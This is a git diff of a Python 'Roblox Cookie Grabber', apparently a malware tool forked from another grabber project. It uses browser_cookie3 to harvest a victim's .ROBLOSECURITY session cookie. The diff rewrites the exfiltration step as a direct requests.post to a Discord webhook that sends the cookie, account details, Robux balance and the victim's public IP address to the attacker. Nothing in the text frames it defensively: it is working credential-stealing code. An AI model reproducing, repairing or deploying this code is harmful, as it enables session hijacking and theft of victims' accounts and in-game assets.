@@ -3,7 +3,6 @@ webhook = ""
 try:
     import robloxpy
     import requests
-    from discordwebhook import * ## I will likely expunge discordwebhook from here in V2.1
     import browser_cookie3
 
 except:
@@ -32,31 +31,30 @@ def cookiecheckerandsend(cookie, platform):
     age = robloxpy.User.External.GetAge(rid)
     crdate = robloxpy.User.External.CreationDate(rid)
 
-    discord = Discord(url=webhook)
-    discord.post(
-    username="ꜱᴏᴍᴇᴛʜɪɴɢ's Roblox Cookie Grabber",
-    avatar_url="https://cdn.discordapp.com/avatars/994230412383633480/1057a089f5141d9aac5848210c55212c.png?size=256",
-    embeds=[
-        {
-            "title": f"🕯 Valid Account - {platform}",
-            "description" : f"[Github Page](https://github.com/something23-0001/-s-Cookie-Grabber) | [Rolimons](https://www.rolimons.com/player/{rid}) | [Roblox Profile](https://web.roblox.com/users/{rid}/profile)",
-            "color" : 12452044,
-            "fields": [
-                {"name": "Username", "value": username, "inline": True},
-                {"name": "Robux", "value": robux, "inline": True},
-                {"name": "Premium", "value": premium,"inline": True},
-                {"name": "Date of Creation", "value": crdate, "inline": True},
-                {"name": "RAP", "value": rap,"inline": True},
-                {"name": "Friends", "value": friends, "inline": True},
-                {"name": "Age", "value": f"{age} Days ; {int(age)/365:.2f} Years", "inline": True},
-                {"name": "IP Address", "value": requests.get("https://api.ipify.org/").text, "inline:": True},
-                {"name": ".ROBLOSECURITY", "value": f"```fix\n{cookie}```", "inline": False},
-            ],
-            "footer": {
-                "text": "V2 | Forked from Mani175's Pirate-Cookie-Grabber"
+    requests.post(url=webhook, json={
+        'username': "ꜱᴏᴍᴇᴛʜɪɴɢ's Roblox Cookie Grabber",
+        'avatar_url': "https://cdn.discordapp.com/avatars/994230412383633480/1057a089f5141d9aac5848210c55212c.png?size=256",
+        'embeds': [{
+                "title": f"🕯 Valid Account - {platform}",
+                "description" : f"[Github Page](https://github.com/something23-0001/-s-Cookie-Grabber) | [Rolimons](https://www.rolimons.com/player/{rid}) | [Roblox Profile](https://web.roblox.com/users/{rid}/profile)",
+                "color" : 12452044,
+                "fields": [
+                    {"name": "Username", "value": username, "inline": True},
+                    {"name": "Robux", "value": robux, "inline": True},
+                    {"name": "Premium", "value": premium,"inline": True},
+                    {"name": "Date of Creation", "value": crdate, "inline": True},
+                    {"name": "RAP", "value": rap,"inline": True},
+                    {"name": "Friends", "value": friends, "inline": True},
+                    {"name": "Age", "value": f"{age} Days ; {int(age)/365:.2f} Years", "inline": True},
+                    {"name": "IP Address", "value": requests.get("https://api.ipify.org/").text, "inline:": True},
+                    {"name": ".ROBLOSECURITY", "value": f"```fix\n{cookie}```", "inline": False},
+                ],
+                "footer": {
+                    "text": "V2 | Forked from Mani175's Pirate-Cookie-Grabber"
+                }
             }
-        }
-    ],
+        ]
+    }
 )
 
 
